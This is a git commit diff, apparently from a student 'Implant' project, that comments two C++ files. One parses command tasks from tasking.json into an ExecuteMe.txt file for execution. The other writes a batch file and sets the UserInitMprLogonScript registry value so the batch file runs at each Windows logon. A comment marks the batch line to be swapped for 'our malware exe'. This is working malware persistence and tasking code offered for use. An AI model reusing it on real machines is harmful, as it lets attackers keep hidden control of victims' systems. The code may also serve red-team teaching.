45263e1e87a8fa7f4565053ef9d9caf8476cea81
Catherine <quachcat@bu.edu>
2022-12-06 01:24:22 -0500

    commented and cleaned code

--- Implant/parse.cpp
+++ Implant/parse.cpp
@@ -7,40 +7,67 @@
 
 using json = nlohmann::json;
 
+    /*
+    parseTasks - Currently takes in no parameters and assumes there is a JSON file to parse called tasking.json
+    If there is no JSON file - it can be changed to take an input object of json.
+
+    The json format to follow is in tasking.json at the moment.
+
+    This method will create a txt file called ExecuteMe which is assumed to be used in a separate execution command
+    */
+
+// std::vector<std::string> if it needs a return
+void parseTasks(void){
     
-    // This takes in - assuming the json file is all set (tasking.json) can be exchanged for json toParse (the input)
-    // and ouputs a vector of strings of commands to be executed
-    // This is assuming that execute will be the next call
-    //INPUT NEEDS TO BE CHANGED TO json toParse
-    //UNLESS IT CAN JUST TAKE IN A JSON FILE!!!
-std::vector<std::string> parseTasks(){
+    // Reads in the JSON using ifstream
     std::ifstream ifs("tasking.json");
-    //std::ifstream ifs(toParse);
+
+    // Parses the input JSON
     json test = json::parse(ifs);
-    //https://json.nlohmann.me/api/basic_json/count/#version-history
+
+    // https://json.nlohmann.me/api/basic_json/count/#version-history
+    // Gets the size of the object
     auto count = test.at("Tasks").size();
-    //std::cout << count;
+
+    // counter
     auto counting = 0;
+
+    // two separate vectors for commands and args
     std::vector<std::string> commands;
     std::vector<std::string> args;
 
+    // Writes in the JSON using ofstream (Creates a ExecuteMe.txt)
     std::ofstream exefile;
-    exefile.open("ExecuteMe.txt");;
+    exefile.open("ExecuteMe.txt");
+
+    // While loop will count through the JSON objects
     while(counting < count){
+
+        // Gets the command and arg lines in the JSON
+        // https://linuxhint.com/parse-json-data-cpp/
+        // https://stackoverflow.com/questions/38099308/accessing-elements-from-nlohmann-json
         std::string cmdline = test.at("Tasks")[counting].at("command");
         std::string argline = test.at("Tasks")[counting].at("args");
+
+        // Pushes them to the std::vector if necessary
         commands.push_back(cmdline);
         commands.push_back(argline);
+
+        // Outputs commandline and arglines to the file
         std::cout << cmdline << argline << std::endl;
-        exefile << cmdline << argline << std::endl;
+        exefile << cmdline << " " << argline << std::endl;
+
+
         counting+=1;
     }
 
     
+    // Closes files
     exefile.close();
+    ifs.close();
 
-    return commands;
-    
+    //return commands;
+    return;
 
 }
 
--- Implant/persist.cpp
+++ Implant/persist.cpp
@@ -14,26 +14,41 @@ int main(int argc, char* argv[]){
     Create the bat file first - and then this following code will create the registry that will
     start the bat file on startup.
     */
+
+   // Creates a folder for the bat file
+
+   // Persistent method found here
+   // https://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/
    mkdir("c:\\test");
+
+   // Writes to a new bat file
    std::ofstream batfile;
    batfile.open("c:\\test\\UserInitMprLogonScript.bat");
+
+   // Commands for file
    batfile << "@echo off\n";
    //Test purposes
    //batfile << "@echo # 'UserInitMprLogonScript'\n";
    //batfile << "@if exist c:\\test\\UserInitMprLogonScript.log @del c:\\test\\UserInitMprLogonScript.log\n";
    //batfile << "@echo UserInitMprLogonScript executed !> c:\\test\\UserInitMprLogonScript.log\n";
+  
    //change this line with our malware exe
    batfile << "@start \"c:\\Windows\\System32\\notepad.exe\\\"\n";
    batfile << "@pause\n";
+   
+   // Close the file since finished with writing
    batfile.close();
 
 
-
+    // Following section creates a registry key to open bat file on Window startup
+    // https://stackoverflow.com/questions/508614/create-a-new-windows-registry-key-using-c
     HKEY hKey;
     LPCTSTR environment = TEXT("Environment");
 
+
     LONG test = RegCreateKeyEx(HKEY_CURRENT_USER, environment, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
 
+    // For testing
     // if(test==ERROR_SUCCESS){
     //     printf("success");
     // }else{
@@ -45,11 +60,14 @@ int main(int argc, char* argv[]){
 
     LONG test2 = RegSetValueEx(hKey, name, 0, REG_SZ, (LPBYTE) data, (_tcslen(data)+1)*sizeof(TCHAR));
 
+    // For Testing
     // if(test2==ERROR_SUCCESS){
     //     printf("success2");
     // }else{
     //     printf("failed2");
     // }
+
+    // Closes handle to key
     RegCloseKey(hKey);
 
 }
